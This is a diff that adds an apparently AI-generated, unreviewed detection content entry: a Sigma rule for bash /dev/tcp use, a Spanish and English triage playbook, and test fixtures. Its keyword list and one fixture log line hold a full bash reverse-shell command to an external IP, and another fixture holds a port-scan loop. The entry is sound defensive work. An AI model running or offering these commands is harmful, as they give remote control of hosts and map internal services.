@@ -1,0 +1,114 @@
+{
+  "rule": {
+    "id": "6cc5fceb-9a71-4c23-aeeb-963abe0b279c",
+    "title": "Suspicious Use of /dev/tcp",
+    "level": "medium",
+    "status": "test",
+    "author": "frack113",
+    "path": "linux/builtin/lnx_susp_dev_tcp.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/linux/builtin/lnx_susp_dev_tcp.yml",
+    "license": "DRL-1.1",
+    "techniques": []
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se registró en un host Linux un comando que usa los pseudodispositivos /dev/tcp o /dev/udp de bash con patrones típicos de reverse shell o escaneo de puertos. Puede indicar que un atacante obtuvo ejecución de comandos y abre un canal hacia un equipo remoto.",
+      "what_it_detects": "Cadenas literales en logs de Linux como 'bash -i >& /dev/tcp/', 'exec 3<>/dev/tcp/', 'cat </dev/tcp/', 'echo >/dev/tcp/' o '0<&196;exec 196<>/dev/tcp/'. Bash usa estas rutas para abrir sockets sin herramientas como netcat.",
+      "why_it_matters": "Con /dev/tcp un atacante puede enviar una shell interactiva a su servidor o escanear puertos internos (T1046, Network Service Discovery) usando solo bash. La regla tiene la etiqueta de reconocimiento, pero varios patrones son de reverse shell e implican control remoto del host.",
+      "triage_steps": [
+        "Lea el mensaje completo: identifique el patrón, la IP o el host de destino, el puerto, el usuario, TTY y PWD (si el origen es sudo).",
+        "Determine si el destino es interno o externo; consulte su reputación y si el host suele conectarse a esa IP.",
+        "Revise conexiones salientes del host hacia esa IP y puerto en firewall, proxy o NetFlow dentro de +/- 15 minutos.",
+        "Identifique el proceso padre (servidor web, cron, sshd, contenedor) en EDR o auditd; un padre como httpd o php-fpm sugiere explotación web.",
+        "Busque en el mismo host y usuario, +/- 15 minutos, descargas (curl, wget), cambios en crontab, claves SSH nuevas o escalada de privilegios.",
+        "Si hay bucles sobre puertos con echo o cat, trátelo como escaneo y busque intentos similares hacia otros hosts.",
+        "Consulte alertas previas del mismo host, usuario e IP de destino."
+      ],
+      "false_positives": [
+        "Scripts de administradores o health checks que prueban puertos con 'echo >/dev/tcp/host/puerto' o 'cat </dev/tcp/'.",
+        "Ejercicios de red team, pentest autorizado o pruebas de Atomic Red Team.",
+        "Laboratorios de capacitación o CTF que ejecutan reverse shells de forma intencional."
+      ],
+      "response_steps": [
+        "Confirme con el dueño del host o el equipo de red team si la actividad estaba autorizada.",
+        "Si no lo estaba, aísle el host o bloquee la IP y el puerto de destino en el perímetro.",
+        "Termine los procesos de shell asociados después de capturar la lista de procesos, conexiones y memoria si es posible.",
+        "Elimine la persistencia encontrada (cron, systemd, authorized_keys) y rote las credenciales del usuario afectado.",
+        "Corrija el vector de entrada (aplicación vulnerable, credencial expuesta) antes de devolver el host a producción."
+      ],
+      "severity_rationale": "Medium es adecuado porque los patrones son muy característicos de shells reversas y escaneos, aunque existen usos administrativos legítimos poco frecuentes de /dev/tcp."
+    },
+    "en": {
+      "summary": "A Linux host logged a command using bash's /dev/tcp or /dev/udp pseudo-devices in a pattern typical of reverse shells or port scanning. This may mean an attacker has command execution and is opening a channel to a remote system.",
+      "what_it_detects": "Literal strings in Linux logs such as 'bash -i >& /dev/tcp/', 'exec 3<>/dev/tcp/', 'cat </dev/tcp/', 'echo >/dev/tcp/' or '0<&196;exec 196<>/dev/tcp/'. Bash uses these paths to open sockets without tools like netcat.",
+      "why_it_matters": "With /dev/tcp an attacker can send an interactive shell to their server or scan internal ports (T1046, Network Service Discovery) with bash alone. The rule is tagged reconnaissance, but several patterns are reverse shells that give remote control.",
+      "triage_steps": [
+        "Read the full message: identify the pattern, destination IP or host, port, user, and TTY/PWD when the source is sudo.",
+        "Decide whether the destination is internal or external; check its reputation and whether the host normally talks to it.",
+        "Check firewall, proxy or NetFlow for outbound connections from the host to that IP and port within +/- 15 minutes.",
+        "Identify the parent process (web server, cron, sshd, container) via EDR or auditd; httpd or php-fpm as parent suggests web exploitation.",
+        "On the same host and user, +/- 15 minutes, look for downloads (curl, wget), crontab changes, new SSH keys or privilege escalation.",
+        "If echo or cat loops over ports, treat it as scanning and look for similar probes against other hosts.",
+        "Review earlier alerts for the same host, user and destination IP."
+      ],
+      "false_positives": [
+        "Admin scripts or health checks testing ports with 'echo >/dev/tcp/host/port' or 'cat </dev/tcp/'.",
+        "Red team exercises, authorized penetration tests or Atomic Red Team tests.",
+        "Training labs or CTF environments that run reverse shells on purpose."
+      ],
+      "response_steps": [
+        "Confirm with the host owner or red team whether the activity was authorized.",
+        "If not, isolate the host or block the destination IP and port at the perimeter.",
+        "Kill the related shell processes after capturing process list, network connections and memory where possible.",
+        "Remove any persistence found (cron, systemd, authorized_keys) and rotate the affected user's credentials.",
+        "Fix the entry vector (vulnerable app, exposed credential) before returning the host to production."
+      ],
+      "severity_rationale": "Medium fits because these patterns strongly indicate reverse shells or scanning, yet rare legitimate administrative uses of /dev/tcp exist."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "sudo log line recording a bash reverse shell to an external IP; contains 'bash -i >& /dev/tcp/'.",
+        "event": {
+          "message": "Oct 25 14:03:12 bastion-01 sudo:    jperez : TTY=pts/1 ; PWD=/home/jperez ; USER=root ; COMMAND=/bin/bash -c bash -i >& /dev/tcp/203.0.113.45/4444 0>&1",
+          "host": "bastion-01",
+          "program": "sudo"
+        }
+      },
+      {
+        "description": "Shell history forwarded to syslog showing a port scan loop; contains 'echo >/dev/tcp/'.",
+        "event": {
+          "message": "Oct 25 14:10:47 web-02 bash[23114]: HISTORY: PID=23114 UID=1001 USER=svc_web CMD=for p in 22 80 443 3306; do echo >/dev/tcp/192.0.2.20/$p && echo \"port $p open\"; done",
+          "host": "web-02",
+          "program": "bash"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate health check using '</dev/tcp/' without cat; matches none of the keywords.",
+        "event": {
+          "message": "Oct 25 14:15:02 app-01 healthcheck[4410]: running: timeout 2 bash -c '</dev/tcp/db.example.com/5432' && echo db reachable",
+          "host": "app-01",
+          "program": "healthcheck"
+        }
+      },
+      {
+        "description": "Admin port test with a space after the redirect ('echo > /dev/tcp/'), so the 'echo >/dev/tcp/' keyword does not match verbatim.",
+        "event": {
+          "message": "Oct 25 14:20:33 bastion-01 sudo:    mrojas : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c echo > /dev/tcp/198.51.100.7/443",
+          "host": "bastion-01",
+          "program": "sudo"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
